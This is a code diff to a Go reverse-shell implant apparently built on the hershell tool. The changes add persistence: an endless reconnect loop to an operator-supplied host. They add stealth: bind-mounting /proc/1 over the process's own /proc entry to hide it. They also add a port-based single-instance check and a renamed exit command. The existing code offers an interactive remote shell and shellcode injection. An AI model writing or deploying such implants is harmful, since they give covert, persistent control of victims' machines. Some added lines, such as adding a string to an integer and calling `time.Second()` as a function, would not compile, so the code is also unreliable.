@@ -6,9 +6,12 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
+	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
+	"time"
 
 	"github.com/lesnuages/hershell/meterpreter"
 	"github.com/lesnuages/hershell/shell"
@@ -54,7 +57,7 @@ func interactiveShell(conn net.Conn) {
 				if len(argv) > 1 {
 					shell.InjectShellcode(argv[1])
 				}
-			case "exit":
+			case "doexit":
 				exit = true
 			case "run_shell":
 				conn.Write([]byte("Enjoy your native shell\n"))
@@ -99,24 +102,59 @@ func reverse(connectString string, fingerprint []byte) {
 	)
 	config := &tls.Config{InsecureSkipVerify: true}
 	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
-		os.Exit(errHostUnreachable)
+		// os.Exit(errHostUnreachable)
+		return
 	}
 
 	defer conn.Close()
 
 	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
-		os.Exit(errBadFingerprint)
+		// os.Exit(errBadFingerprint)
+		return
 	}
 	interactiveShell(conn)
 }
 
+func cmdRun(cmd string, shell bool) string {
+
+	if shell {
+		out, err := exec.Command("sh", "-c", cmd).Output()
+		if err != nil {
+			return ""
+		}
+		return strings.TrimSpace(string(out))
+	} else {
+		out, err := exec.Command(cmd).Output()
+		if err != nil {
+			return ""
+		}
+		return strings.TrimSpace(string(out))
+	}
+}
+
+func hideSelf(pid int) {
+	// hide process bind /proc/1
+	hideCmd := fmt.Sprintf("mount -o bind /proc/%d /proc/%d", pid, os.Getpid())
+	cmdRun(hideCmd, true)
+}
+
 func main() {
+
+	_, err := net.Listen("tcp", ":"+65534)
+	if err != nil {
+		return
+	}
+
+	hideSelf(1)
 	if connectString != "" && fingerPrint != "" {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
 			os.Exit(errCouldNotDecode)
 		}
-		reverse(connectString, bytesFingerprint)
+		for {
+			reverse(connectString, bytesFingerprint)
+			time.Sleep(time.Duration(60) * time.Second())
+		}
 	}
 }
